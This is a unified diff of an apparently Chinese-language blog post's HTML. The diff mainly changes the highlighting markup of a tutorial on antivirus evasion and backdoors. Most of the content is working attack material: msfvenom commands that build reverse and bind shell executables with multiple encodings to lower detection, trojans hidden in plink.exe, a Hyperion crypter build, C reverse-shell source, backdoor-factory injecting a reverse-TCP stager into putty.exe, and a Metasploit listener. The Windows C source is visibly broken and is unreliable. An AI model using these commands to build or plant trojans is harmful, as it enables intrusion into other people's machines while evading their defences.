@@ -498,10 +498,14 @@
 <h4 id="5-生成病毒程序"><a href="#5-生成病毒程序" class="headerlink" title="5.生成病毒程序"></a>5.生成病毒程序</h4><h5 id="1-生成程序"><a href="#1-生成程序" class="headerlink" title="1.生成程序"></a>1.生成程序</h5><ul>
 <li>生成反弹 shell</li>
 </ul>
-<pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp lhost=10.10.10.131 lport=4444 -a x86 --platform win -f exe -o a.exe</code></pre><ul>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell/bind_tcp lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -a x86 --platform win -f exe -o a.exe</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>加密编码反弹 shell</li>
 </ul>
-<pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp lhost=10.10.10.132 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b &#39;\x00&#39; -f exe -o b.exe</code></pre><ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/shell/bind_tcp <span class="attribute">lhost</span>=10.10.10.132 <span class="attribute">lport</span>=4444 -f<span class="built_in"> raw </span>-e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f<span class="built_in"> raw </span>| msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b <span class="string">'\x00'</span> -f exe -o b.exe</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>比较编码前后的检测率<ul>
 <li>未经过编码的 a.exe 检测率是 45%</li>
 </ul>
@@ -511,10 +515,14 @@
 <h5 id="2-隐藏shell"><a href="#2-隐藏shell" class="headerlink" title="2.隐藏shell"></a>2.隐藏shell</h5><ul>
 <li>利用模板隐藏 shell</li>
 </ul>
-<pre><code>  root@kali:~# msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=10.10.10.131 lport=4444 -a x86 --platform win -f exe -o c.exe</code></pre><ul>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -a x86 --platform win -f exe -o c.exe</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>多重编码</li>
 </ul>
-<pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=10.10.10.131 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; d.exe</code></pre><ul>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -e x86/shikata_ga_nai -i <span class="number">5</span> -a x86 --platform win -f exe &gt; d.exe</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li><p>比较编码前后的检测率</p>
 <ul>
 <li>未经过编码的 c.exe 检测率是 40%</li>
@@ -532,18 +540,9 @@
 <li>Hyperion （32bit PE 程序加密器）</li>
 <li>Crypter / Container（解密器 PE Loader ）</li>
 </ul>
-<pre><code>  root@kali:~# git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip
-  root@kali:~# unzip Hyperion-1.2.zip
-  root@kali:~# dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># unzip Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成加密器</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成木马程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.131 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o p.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对木马程序进行加密</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># wine h.exe p.exe x.exe</span></span><br></pre></td></tr></table></figure>
 
-  # 生成加密器
-  root@kali:~# cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe
-
-  # 生成木马程序
-  root@kali:~# msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.131 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o p.exe
-
-  # 对木马程序进行加密
-  root@kali:~# wine h.exe p.exe x.exe</code></pre><ul>
+<ul>
 <li><p>比较编码前后的检测率</p>
 <ul>
 <li>未经过编码的 p.exe 检测率是 45%</li>
@@ -557,82 +556,26 @@
 <h4 id="7-自己编写后门"><a href="#7-自己编写后门" class="headerlink" title="7.自己编写后门"></a>7.自己编写后门</h4><ul>
 <li>Windows reverse shell</li>
 </ul>
-<pre><code>  root@kali:~# wine gcc.exe windows.c -o windows.exe -lws2_32</code></pre><ul>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># wine gcc.exe windows.c -o windows.exe -lws2_32</span></span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>Linux shellg’c’c</li>
 </ul>
-<pre><code>  root@kali:~# gcc linux_revers_shell.c -o linux
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># gcc linux_revers_shell.c -o linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc -nvlp 333</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ./linux 127.0.0.1 333</span></span><br></pre></td></tr></table></figure>
 
-  # 测试程序
-  root@kali:~# nc -nvlp 333
-  root@kali:~# ./linux 127.0.0.1 333</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413174142304.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190413174142304.png" alt="在这里插入图片描述"></p>
 <p><img src="https://img-blog.csdnimg.cn/20190413174147316.png" alt="在这里插入图片描述"></p>
 <ul>
 <li>linux_revers_shell.c</li>
 </ul>
-<pre><code>  #include &lt;stdio.h&gt;
-  #include &lt;sys/socket.h&gt;
-  #include &lt;arpa/inet.h&gt;
-  #include &lt;stdlib.h&gt;
-  #include &lt;string.h&gt;
-  #include &lt;unistd.h&gt;
-  #include &lt;netinet/in.h&gt;
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line">	<span class="keyword">int</span> s;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"uso: 192.168.153.166 4444\n"</span>); <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	sock.sin_family  = AF_INET;</span><br><span class="line">	sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">	sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">	s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">connect</span>(s,(struct sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">	</span><br><span class="line">	dup2(s,<span class="number">0</span>);</span><br><span class="line">	dup2(s,<span class="number">1</span>);</span><br><span class="line">	dup2(s,<span class="number">2</span>);</span><br><span class="line">	execl(<span class="string">"/bin/sh"</span>,<span class="string">"httpd"</span>,(<span class="keyword">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-  int main(int argc, char *argv[])
-  {
-      struct sockaddr_in sock;
-      int s;
-      if (argc != 3)
-      {
-          fprintf(stderr, &quot;uso: 192.168.153.166 4444\n&quot;); exit(1);
-      }
-      sock.sin_family  = AF_INET;
-      sock.sin_port = htons(atoi(argv[2]));
-      sock.sin_addr.s_addr = inet_addr(argv[1]);
-      s = socket(AF_INET, SOCK_STREAM, 0);
-
-      connect(s,(struct sockaddr_in *)&amp;sock, sizeof(struct sockaddr_in));
-
-      dup2(s,0);
-      dup2(s,1);
-      dup2(s,2);
-      execl(&quot;/bin/sh&quot;,&quot;httpd&quot;,(char *)0); //precess httpd
-  }</code></pre><ul>
+<ul>
 <li>windows.c</li>
 </ul>
-<pre><code>  # 未修正错误
-  #include &lt;winsock2.h&gt;
-  #include &lt;stdio.h&gt;
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	SOCKET Winsock;</span><br><span class="line">	SOOKET Sock;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line">	<span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">	STARTUPINFO ini_processo;</span><br><span class="line">	PROCESS_INFORMATION processo_info;</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function">	<span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">	winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">	&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">	host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line">	<span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">	hax.sin_family = AF_INET;</span><br><span class="line">	hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">	hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">	WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">	ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">	ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span class="line">	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">	CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure>
 
-  #pragma comment(lib,&quot;ws2_32&quot;)
-
-      WSADATA wsaData;
-      SOCKET Winsock;
-      SOOKET Sock;
-      struct sockaddr_in hax;
-      char ip_addr[16];
-      STARTUPINFO ini_processo;
-      PROCESS_INFORMATION processo_info;
-
-  int main(int argc,char *argv[])
-      WSAStartup(MAKEWORD(2,2), wsaData);
-      winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
-
-      if (argc != 3)
-      {fprintf(stderr,&quot;Uso: &lt;rhost&gt; &lt;rport&gt;\n&quot;;) exit(1);}
-      struct hostent *host;
-      host = gethostbyname(argv [1] );
-      strcpy(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));
-
-      hax.sin_family = AF_INET;
-      hax.sin_port = htons(atoi(argv[2]));
-      hax.sin_addr.s_addr = inet_addr(ip_addr);
-
-      WSAConnect(Winsock,(SOCKADDR* &amp;hax,sizeof(hax),NULL,NULL,NULL,NULL;
-      memset(&amp;ini_processo,0,sizeof(ini_processo));
-      ini_processo.cb = sizeof(ini_processo);
-      ini_processo.dwFlags = START_USESTDHANDLES;
-      ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
-      CreateProcess(NULL,&quot;cmd exe&quot;,NULL,NULL,TRUE,0,NULL,NULL,&amp;ini_processo,&amp;process_info);</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413174154985.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190413174154985.png" alt="在这里插入图片描述"></p>
 <h4 id="后门工具–Backdoor-factory"><a href="#后门工具–Backdoor-factory" class="headerlink" title="后门工具–Backdoor-factory"></a>后门工具–Backdoor-factory</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
 <li>patch<ul>
 <li>通过替换 exe、dll、注册表等方法修复系统漏洞或问题的方法</li>
@@ -718,56 +661,52 @@
 </ul>
 <h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><ul>
 <li><p>-S：检查二进制文件是否支持代码注入</p>
-<pre><code>  root@kali:~# backdoor-factory -f putty.exe –S</code></pre></li>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe –S</span></span><br></pre></td></tr></table></figure>
+
+</li>
 </ul>
 <p><img src="https://img-blog.csdnimg.cn/20190525145311915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <ul>
 <li>-c: 在确定其支持patch 后，我们再来查看其是否支持我们指定的 shellcode patch</li>
 </ul>
-<pre><code>  -c：code cave(代码裂缝)
-  -l：代码裂缝大小
-  root@kali:~# backdoor-factory -f putty.exe -c -l 200</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145320244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-c：code cave(代码裂缝)</span><br><span class="line">-l：代码裂缝大小</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -c -l 200</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190525145320244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <ul>
 <li><p>-s SHELL, –shell=SHELL: 可以使用的有效负载。使用“show”来查看有效载荷</p>
-<pre><code>  root@kali:~# backdoor-factory -f putty.exe -s show</code></pre></li>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f putty.exe -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure>
+
+</li>
 </ul>
 <p><img src="https://img-blog.csdnimg.cn/201905251453287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<pre><code>  root@kali:~# backdoor-factory -f `which nc` -s show</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145334950.png" alt="在这里插入图片描述"></p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f `which nc` -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190525145334950.png" alt="在这里插入图片描述"></p>
 <ul>
 <li><p>注入 putty.exe，报错</p>
-<pre><code>  root@kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</code></pre></li>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> -o putty2.exe</span><br></pre></td></tr></table></figure>
+
+</li>
 </ul>
 <p><img src="https://img-blog.csdnimg.cn/20190525145341279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<pre><code>  [!] Enter your selection: 2</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145347873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[!]</span> <span class="attr">Enter your selection:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190525145347873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <ul>
 <li><p>显示未找到文件</p>
-<pre><code>  Failed to read certificate file: /usr/share/backdoor-factory/certs/Verisign.cer
-  139701503748160:error:02001002:system library:fopen:No such file or directory:bss_file.c:175:fopen(&#39;/usr/share/backdoor-factory/certs/VerisignPrivateKey.pem&#39;,&#39;rb&#39;)
-  139701503748160:error:2006D080:BIO routines:BIO_new_file:no such file:bss_file.c:182:
-  139701503748160:error:02001002:system library:fopen:No such file or directory:bss_file.c:175:fopen(&#39;/usr/share/backdoor-factory/certs/Verisign.cer&#39;,&#39;rb&#39;)
-  139701503748160:error:2006D080:BIO routines:BIO_new_file:no such file:bss_file.c:182:
-  Failed
-  File putty5.exe is in the &#39;backdoored&#39; directory</code></pre></li>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Failed to read certificate <span class="string">file:</span> <span class="regexp">/usr/</span>share<span class="regexp">/backdoor-factory/</span>certs/Verisign.cer</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/VerisignPrivateKey.pem'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/Verisign.cer'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line">Failed</span><br><span class="line">File putty5.exe is <span class="keyword">in</span> the <span class="string">'backdoored'</span> directory</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>修复错误（备份并重命名）</p>
-<pre><code>  root@kali:~# cat /usr/share/backdoor-factory/certs/
-  passFile.txt           signingCert.cer        signingPrivateKey.pem  
-  root@kali:~# cd /usr/share/backdoor-factory/certs/
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /usr/share/backdoor-factory/certs/</span></span><br><span class="line">passFile.txt           signingCert.cer        signingPrivateKey.pem  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd /usr/share/backdoor-factory/certs/</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingCert.cer signingCert.cer.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingCert.cer Verisign.cer</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingPrivateKey.pem signingPrivateKey.pem.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingPrivateKey.pem VerisignPrivateKey.pem</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</span></span><br></pre></td></tr></table></figure>
 
-  root@kali:/usr/share/backdoor-factory/certs# cp signingCert.cer signingCert.cer.bak
-  root@kali:/usr/share/backdoor-factory/certs# mv signingCert.cer Verisign.cer
-  root@kali:/usr/share/backdoor-factory/certs# cp signingPrivateKey.pem signingPrivateKey.pem.bak
-  root@kali:/usr/share/backdoor-factory/certs# mv signingPrivateKey.pem VerisignPrivateKey.pem
-
-  root@kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</code></pre></li>
+</li>
 </ul>
 <p><img src="https://img-blog.csdnimg.cn/20190525145357145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <ul>
 <li><p>使用 msf 侦听</p>
-<pre><code>  msf &gt; use exploit/multi/handler
-  msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
-  msf exploit(multi/handler) &gt; set LHOST 10.10.10.131
-  msf exploit(multi/handler) &gt; set LPORT 4444
-  msf exploit(multi/handler) &gt; run</code></pre></li>
